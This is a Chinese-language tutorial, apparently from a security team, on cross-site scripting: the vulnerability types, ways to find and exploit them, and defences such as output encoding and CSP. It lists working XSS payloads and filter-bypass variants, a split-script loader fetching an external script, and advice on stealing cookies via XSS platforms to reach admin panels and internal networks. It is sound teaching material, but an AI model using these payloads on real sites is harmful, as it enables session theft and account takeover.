# XSS跨站脚本漏洞

XSS（Cross Site Script，跨站脚本）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，跨站脚本攻击缩写为XSS。

## 本质

客户端代码注入漏洞，通常注入代码是js脚本

## 危害

1. 盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号
2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
3. 盗窃企业重要的具有商业价值的资料
4. 非法转账
5. 强制发送电子邮件
6. 网站挂马
7. 控制受害者机器向其它网站发起攻击

## XSS跨站原理

> 当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞
>
> 这个“跨”实际上属于浏览器的特性，而不是缺陷;
>
> 浏览器同源策略：只有发布Cookie的网站才能读取Cookie。
>
> 会造成Cookie窃取、劫持用户Web行为、结合CSRF进行针对性攻击等危害

## 分类

### 反射型 （非持久型）

非持久型XSS攻击是一次性的，仅对单次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接来诱使客户点击，比如这样的一段链接：`www.wgpsec.org/?params=<script>alert(/xss/)</script>`，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击的目的。

**攻击步骤**

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

该类型XSS常见于搜索、存在传参输出的地方。

### 存储型 XSS

这种类型的XSS，危害比前一种大得多。比如一个攻击者在用户名中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

**攻击步骤**

1. 攻击者将将恶意代码提交到目标网站的数据库中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**反射型 XSS 跟存储型 XSS 的区别**

存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。



#### DOM型

> 基于文档对象模型(Document Object Model)的一种漏洞；
>
> DOM型与反射型类似，都需要攻击者诱使用户点击专门设计的URL；
>
> Dom型xss是通过url传入参数去控制触发的；
>
> Dom型返回页面源码中看不到输入的payload， 而是保存在浏览器的DOM中。

这种类型则是利用非法输入来闭合对应的html标签。

比如，有这样的一个a标签：`<a href='$var'></a>`
乍看问题不大，可是当`$var的内容变为 'οnclick='alert(/xss/) //`，这段代码就会被执行。

**假设应用程序返回的页面包含以下脚本：**

```javascript
<script>
    var url = document.location;
    url = unescape(url);
    var message = url.substring(url.indexOf('message=') + 8,url.length);
    document.write(message);
</script>
```

把javascript代码作为message的参数，这段代码将会被动态的写入到页面中，

并像服务器返回代码一样得以执行。

**攻击步骤**

1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL。
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

**DOM型XSS 跟前两种 XSS 的区别**

DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

**DOM型XSS 和 反射型 XSS 的区别**

反射型XSS提交的数据会经过服务器，而DOM型XSS不会，这个的意思呢就是不论你后面加多少WAF都是无济于事的。

推荐阅读： [记一次从DOM型XSS到RCE过程](https://xz.aliyun.com/t/3919)

# 查找利用XSS漏洞

## 基本验证

```javascript
"><script>alert(document.cookie)</script>
```

把这个字符串提交给每个应用程序页面的每个参数；

同时监控它的响应，如果攻击字符串原样出现在响应中，就可能存在XSS漏洞。

许多应用可能会经过黑名单等简单的初步过滤，试图阻止XSS攻击；

可以通过编码等方式绕过：

```javascript
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00"><script>alert(document.cookie)</script>
```

当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器的DOM中，并可被客户端javascript访问。

在这种情况下，以上基本验证无法发现XSS漏洞。

简单来说，主要是以下过程。

### 寻找可控点

1. 找到可控点，比如一段搜索参数，在提交或输入参数后翻阅源代码 我们输入的源数据是否被原样输出
2. 看可控点是否可以闭合标签，尝试单引号双引号方式输入特殊字符尝试是否过滤
3. 尝试输入一些会让程序报错的语句 比如单个 `'` `"` `<` `>` 等
4. 阅读代码找到可控点
5. 找到可控点且可利用，但是有过滤，可尝试各种绕过方式去触发



## 查找反射型XSS

#### 测试引入脚本的反射

**例1**，标签属性值：

假设返回页面中包含以下脚本：

```javascript
<input type="text" name="name" value="test-text" >
```

很明显，利用xss的方法是终止包含字符串的双引号，结束``标签

```javascript
"><script>alert(1)</script>
```

**例2**，javascript字符串：

假设返回页面中包含以下脚本：

```javascript
<script>var a='test-text'; var b=123;...</script>
```

用分号终止语句

```javascript
'; alert(1); var foo='
```

**例3**，包含URL的特性

假设返回页面中包含以下脚本：

```javascript
<a href="test-text">Click here</a>html
```

这时，受控制的字符插入到一个``标签的`href`属性中。

这个属性可能包含一个使用`javascript:`协议的URL，利用：

```javascript
javascript:alert(1);
```

**例4**，输出点存在JS内且转义

```php+HTML
<!DOCTYPE html>
<html>
<head>
	<title>XSS转义</title>
</head>
<body>
	XSS
<?php
/**
 * Created by PhpStorm.
 * User: keac wu
 * Date: 2019/12/26 0012
 * Time: 15:53
 */

 $input= $_GET["xss"];
 echo htmlspecialchars("$input");
 ?>
<script type="text/javascript">
	var a='<?php echo htmlspecialchars("$input") ?>';
	console.log(a)
</script>

</body>
</html>
```

这种情况下，当我们直接输入 `<script></script>` 什么的HTML标签的时候会被直接转义

>  htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。
>
> 预定义的字符是：
>
> - & （和号）成为 &
> - " （双引号）成为 "
> - ' （单引号）成为 '
> - < （小于）成为 <
> - \> （大于）成为 >

![sdf](https://www.loongten.com/2019/12/23/pentest-learn-xss/8.png)

这种时候我们就要尝试，看看单引号 双引号会不会被过滤，最后看到是单引号不会被过滤，而且只有单个单引号的时候会报错。

![sdf](https://www.loongten.com/2019/12/23/pentest-learn-xss/9.png)

这种时候就可以利用了

`';alert(1)//`



![sdf](https://www.loongten.com/2019/12/23/pentest-learn-xss/10.png)

![sdf](https://www.loongten.com/2019/12/23/pentest-learn-xss/11.png)

**例5**，输出点存在JS内怎么触发

```php+HTML
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	XSS 在函数情况情况下。。。<br>
<?php
/**
 * Created by PhpStorm.
 * User: keac wu
 * Date: 2019/12/26 0012
 * Time: 15:53
 */

 $input= $_GET["xss"];
 echo htmlspecialchars("$input");

 ?>
  <input type="text" id="myInput" onclick="myFunction()">
<script type="text/javascript">

function myFunction() {
    var a= '<?php  echo htmlspecialchars("$input") ?>';
}

</script>

</body>
</html>
```

当我们利用上一种方式也是可以触发弹窗，但是每次都需要去点一下文本框才能触发，在实战场景中比较鸡肋

![sdf](https://www.loongten.com/2019/12/23/pentest-learn-xss/12.png)

Payload

```javascript
'};alert(1); function a(){//
```

![sdf](https://www.loongten.com/2019/12/23/pentest-learn-xss/13.png)

使用这个payload，可以直接弹窗

我们首先用 `'`去截断了前面的字符串，然后拼接完整的函数，中间插入我们需要执行的代码:`alert(1);` 完成了这一步之后，因为源函数后面还有个`}`，我们需要自己写个函数去完善掉 `function a(){//` ，并且把最后的单引号和分号结束掉，那么在页面一打开我们的函数就会被执行。

#### 脚本标签

**事件处理器**

有大量事件处理器可与各种标签结合使用，用于执行脚本。

一些示例，可在不需要任何用户交互的情况下执行脚本：

```javascript
<style onreadystatechange=alert(1)></style>
<iframe onreadystatechange=alert(1)></iframe>
<object onerror=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<body onbeforeactivate=alert(1)></body>
<video src=1 onerror=alert(1)></video>
<audio src=1 onerror=alert(1)>
```

**脚本伪协议**

脚本伪协议可用在任何位置，以在需要URL的属性中执行行内脚本。

```javascript
<object data=javascript:alert(1)></object>
<iframe src=javascript:alert(1)></iframe>
<event-source src=javascript:alert(1)></event-source>
```

#### 避开过滤:HTML

**标签名称**

改变字符大小写

```javascript
<iMg onerror=alert(1) src=a>
```

插入NULL字节

```javascript
<[%00]img onerror=alert(1) src=a>
```

标签名称后的空格

一些可用于替代空格的字符

```javascript
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
```

**属性名称**

绕开一些检查以`on`开头的过滤器

```javascript
<img o[%00]nerror=alert(1) src=a>
```

属性分隔符,把多个属性分隔开

```javascript
<img onerror='alert(1)'src=a>
```

**属性值**

可以用NULL字节或HTML编码属性值

```javascript
<img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
```

> HTML编码 十六进制编码 base64编码 ASCII编码

以下属性可以被编码：

```javascript
href=
action=
formaction=
location=
on*=
name=
background=
poster=
src=
code=
data= //只支持base64
```

**字符集**

有时可用一些非标准编码绕开过滤器

UTF-7、US-ASCII、UTF-16

**拆分跨站：**

当应用程序没有过滤<、>关键字却限制了字符长度时可用拆分跨站

```javascript
<script>z='<script src=';/*

*/z+='test.c';/*

*/z+='n/1.js><0/script>';/*

*/document.write(z)</script>
```

最终执行

```
<script>

z='undefined<script src=test.cn/1.js></script>';

document.write(z)

</script>
```

#### 避开过滤：脚本代码

有些过滤器可能阻止javascript关键字和表达式，有用的字符，比如引号、括号和圆点。

**Unicode转义**

```javascript
<script>a\u006cert(1)</script>
```

如果能够使用eval命令，就能够将其它命令以字符串的格式传送给eval，从而执行其它 命令。

```javascript
<script>eval('a\u006cert(1)');</script>
```

**替代圆点**

```javascript
<script>alert(document['cookie'])</script>
<script>with(document)alert(cookie)</script>
```

## 查找利用存储型XSS

确定保存型XSS漏洞的过程与前面描述的确定反射型XSS漏洞的过程类似。 

但是，这两个过程之间也存在一些重要的区别；

在进行测试时必须记住这些区别，以确定尽可能多的漏洞。

> (1) 向应用程序的每一个可能的位置提交一个特殊字符串后，必须反复检查应用程序的全部内容与功能；
>
> (2) 如有可能，应检查管理员能够访问的区域，确定其中是否有可以被非管理用户控制的数据；
>
> ​      比如有些应用可以在浏览器查看日志，攻击者可留下恶意的HTML日志加以利用；
>
> (3) 检查应用的整个流程，确保测试彻底，检查任何可控的带外通道，如HTTP消息头；

**在上传文件中测试XSS**

如果应用程序允许用户上传可被其它用户查看下载的文件，就会出现保存型XSS，这种漏洞常被人们忽略。

测试时，首先上传一个验证性的HTML文件。

如果该文件被接受，则尝试以正常方式下载该文件。

如果应用程序按照原样返回最初的文件，并且脚本被执行，则应用肯定易于受到攻击。

**例：**可把XSS的payload做成图片木马，上传到用户头像(用各种方法去绕过上传限制)

## 查找并利用DOM型的XSS漏洞

确定基于DOM型的XSS漏洞，一种有效的方法是，检查所有客户端JavaScript， 

看其中是否使用任何可能会导致漏洞的DOM属性。

工具[DOMTracer](https://www.blueinfy.com/#DOMTracer)可自动完成这个测试过程。

检查每一段客户端JavaScript，看其中是否出现以下API

它们可用于访问通过一个专门设计的URL控制的DOM数据；

```javascript
 document.location
 document.URL
 document.URLUnencoded
 document.referrer
 window.location
```

在每一个使用上述API的位置，仔细检查那里的代码，确定应用程序如何处理用户可控的数据；

以及是否可以使用专门设计的输入来执行JavaScript。

尤其注意检查并测试控制的数据被传送至以下任何一个API的情况

```javascript
document.write()
document.writeln()
document.body.innerHtml
eval()
window.execScript()
window.setInterval()
window.setTimeout()
```

片段技巧：服务器不解析url中#后的内容



**更多实战例子文章可见 plat.wgpsec.org**



# 防止XSS攻击

## 防止反射型与存储型XSS

用户可控的数据未经适当的确认与净化就被复制到应用程序响应中，这是造成反射型与保存型XSS漏洞的根本原因 

**1.确认输入**

> 数据不能太长
>
> 数据仅包含某组合法字符
>
> 数据与一个特殊的正则表达式相匹配

根据应用程序希望在字段中收到的数据类型，应尽可能的限制性的对姓名、电子邮件地址、账号等

应用不同的确认规则。

**2.确认输出**

如果应用程序将某位用户或第三方提交的数据复制到它的响应中，应对这些数据进行HTML编码，净化恶意代码。

**3.消除危险插入点**

应尽量避免直接在现有的JavaScript中插入用户可控的数据；

如果标签属性接受URL作为它的值，应避免嵌入用户的输入；

**4.允许有限的HTML**

一些应用程序允许用户以HTML格式提交即将插入到应用程序响应中的数据。

例如博客、论坛的富文本编辑器允许使用HTML书写。

有各种框架(如OWASP AntiSamy项目)可用于确认用户提交的HTML标记，以确保其中未包含任何执行JavaScript的方法。

## 防止基于DOM的XSS漏洞

造成这种漏洞并无法不需要将用户可控的数据复制到服务器响应中，所以上述防范方法对DOM型XSS无用；

应用程序应尽量避免使用客户端脚本处理DOM数据并把它插入到页面中；

如果无法避免，应使用以下两种方法防御DOM型XSS攻击。

**1.确认输入**

客户端，确认将要插入到文档中的数据仅包含字母数字与空白符

```javascript
<script>
    var a = document.URL;
    a = a.substring(a.indexOf("message=") + 8, a.length);
    a = unescape(a);
    var regex=/^(A-Za-z0-9+\s)*$/;
    if (regex.test(a))
        document.write(a);
</script>
```

服务端，对URL数据进行严格确认

> 查询字符串中只有一个参数
>
> 参数名大小写检查
>
> 参数值仅包含数字字母

**2.确认输出**

在将用户可控的DOM数据插入到文档之前，进行HTML编码

```javascript
<?php
    function reinit(str)
    {
        var d = document.createElement('div');
        d.appendChild(document.createTextNode(str));
        return d.innerHTML;
    }
?>
```

## 其他 XSS 防范措施

介绍一些通用的方案，可以降低 XSS 带来的风险和后果。

**Content Security Policy**

严格的 CSP 在 XSS 的防范中可以起到以下的作用：

> 禁止加载外域代码，防止复杂的攻击逻辑。
>
> 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
>
> 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
>
> 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
>
> 合理使用上报可以及时发现 XSS，利于尽快修复问题。

**输入内容长度控制**

对于不受信任的输入，都应该限定一个合理的长度。

虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。

**HTTP-only**

HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。

验证码：防止脚本冒充用户提交危险操作。

# xss工具

XSS前端编码：https://github.com/evilcos/xssor2 

XSS平台： https://github.com/trysec/BlueLotus_XSSReceiver 

Xss-cheat-sheet： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

**XSS_Fuzz**

| 官网                                                         | 软件对应科普文                                               |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| [BruteXSS](https://github.com/ym2011/PEST/tree/master/BruteXSS) | [Freebuf相关科普](https://www.freebuf.com/sectool/109239.html) [汉化版](https://www.cnblogs.com/Pitcoft/p/6341322.html) |
| [XSSfrok](https://github.com/bsmali4/xssfork)                | [Seebug作者教程](https://paper.seebug.org/359/#xssfork)      |

**在线XSS平台**

| 名称   | 地址            |
| ------ | --------------- |
| XSS SB | https://xs.sb/  |
| XSS PT | https://xss.pt/ |

**自建XSS平台**

1. https://github.com/firesunCN/BlueLotus_XSSReceiver

2. https://github.com/mandatoryprogrammer/xsshunter

   

**如何快速发现 xss 位置 ？**

对于反射型`XSS`：

一般来说就是找输入点的可控参数，比如搜索框、留言板、 登录 / 注册，构造payload发送，监控响应

上边这种方法不适用于DOM型`XSS`，因为 基于DOM的`XSS`漏洞 ， payload并不在服务器的响应中返回，而是保存在浏览器的DOM中



对于存储型`XSS`：正常的输入payload查看是否过滤，也可以反向猜测输出点，构造payload去输入

**XSS 蠕虫的产生条件 ？**

1. 可以执行恶意操作；

2. 可以感染并传播 

   > 就是产生`XSS`点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生 （微博、贴吧）
   >
   > 由于`XSS`蠕虫基于浏览器而不是操作系统，取决于其依赖网站的规模，它可以在短时间内达到对巨大数量的计算机感染 

[一个大佬的博客各种XSS蠕虫源码分析](https://www.cnblogs.com/milantgh/p/3655070.html)

**`XSS`，能打到后台，但是后台系统处于内网，怎么做内网探测？**

`XSS`平台拿cookie登录后台，或钓鱼拿登录，然后找上传点`getshell`，然后结合msf使用

两个实例参考：

https://bbs.ichunqiu.com/thread-46068-1-1.html?from=bkyl

https://shuimugan.com/bug/view?bug_no=76685（这是乌云漏洞库镜像）

> github有一些现成的xss扫描内网端口的脚本，可以参考利用，再根据探测出来的信息进一步利用，比如开了redis等，再就是利用漏洞去getshell

**XSS+CSRF组合拳**

[一次XSS和CSRF的组合拳进攻 (CSRF+JSON)](https://damit5.com/2018/06/02/%E4%B8%80%E6%AC%A1XSS%E5%92%8CCSRF%E7%9A%84%E7%BB%84%E5%90%88%E6%8B%B3%E8%BF%9B%E6%94%BB-(CSRF+JSON)/) 

[各种漏洞组合拳打出不一样的姿势](https://forum.90sec.com/t/topic/211)

